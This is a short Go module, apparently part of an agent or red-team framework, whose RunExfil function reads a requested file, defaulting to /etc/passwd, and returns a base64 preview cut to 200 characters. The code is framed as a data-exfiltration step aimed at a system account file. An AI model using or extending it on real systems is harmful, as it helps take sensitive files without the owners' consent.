package modules

import (
	"encoding/base64"
	"io/ioutil"
	"os"
)

func RunExfil(params map[string]interface{}) map[string]interface{} {
	res := make(map[string]interface{})
	path, ok := params["path"].(string)
	if !ok {
		path = "/etc/passwd"
	}
	data, err := ioutil.ReadFile(path)
	if err != nil {
		res["error"] = err.Error()
		return res
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	res["file"] = path
	res["size"] = len(data)
	res["b64"] = encoded[:min(200, len(encoded))] + "... (truncated)"
	return res
}